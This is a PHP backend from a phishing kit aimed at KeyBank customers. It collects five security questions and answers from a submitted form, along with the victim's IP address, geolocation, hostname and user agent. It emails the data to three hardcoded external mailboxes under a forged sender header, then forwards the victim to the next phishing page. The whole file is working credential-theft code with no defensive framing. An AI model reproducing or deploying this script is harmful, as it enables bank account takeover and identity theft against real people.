<?php
if($_POST["ans1"] != "" and $_POST["ans2"] != ""){
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------KeyBank Info-----------------------\n";
$message .= "|Security Question 1 : ".$_POST['q1']."\n";
$message .= "|Answer : ".$_POST['ans1']."\n";
$message .= "|Security Question 2 : ".$_POST['q2']."\n";
$message .= "|Answer : ".$_POST['ans2']."\n";
$message .= "|Security Question 3 : ".$_POST['q3']."\n";
$message .= "|Answer : ".$_POST['ans3']."\n";
$message .= "|Security Question 4 : ".$_POST['q4']."\n";
$message .= "|Answer : ".$_POST['ans4']."\n";
$message .= "|Security Question 5 : ".$_POST['q5']."\n";
$message .= "|Answer : ".$_POST['ans5']."\n";
$message .= "--------------IP DETAIL-----------------------\n";
$message .= "Date: ".$adddate."\n";
$message .= "Ip Address : ".getenv("REMOTE_ADDR")."\nProvider      : ";
$message .= "Ip Info       http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "---------------Created BY Unknown-------------\n";
$send = "gregweedon9090@gmail.com,johncomb1001@hotmail.com,andrewrounds7887@mail.com";
$subject = "Result .$ip.";
$headers = "From: Google Doc<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

 header ("Location: step4.php");
}else{
header ("Location: index.php");
}
	
?>